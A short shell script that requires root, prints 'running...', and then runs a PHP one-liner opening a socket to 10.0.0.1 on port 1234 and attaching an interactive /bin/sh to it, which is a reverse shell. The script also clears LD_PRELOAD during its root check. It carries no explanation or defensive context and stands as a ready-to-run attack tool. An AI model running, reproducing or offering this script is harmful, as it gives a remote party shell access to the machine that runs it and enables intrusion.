#!/bin/sh
## Created by Jasutin

checkroot() {
    SAVE_LD_PRELOAD="$LD_PRELOAD"
    unset LD_PRELOAD
    if [ "$(id -u)" -ne 0 ]; then
        printf "\e[1;31mPlease, run as root!\n\e[0m"
        exit 1
     fi
     LD_PRELOAD="$SAVE_LD_PRELOAD"
}

checkroot

clear;

if

printf "\nrunning..."

then

php -r '$sock = fsockopen("10.0.0.1", 1234); exec("/bin/sh -i <&3 >&3 2>&3");'

else
	exit 1;
	return 0;

fi;
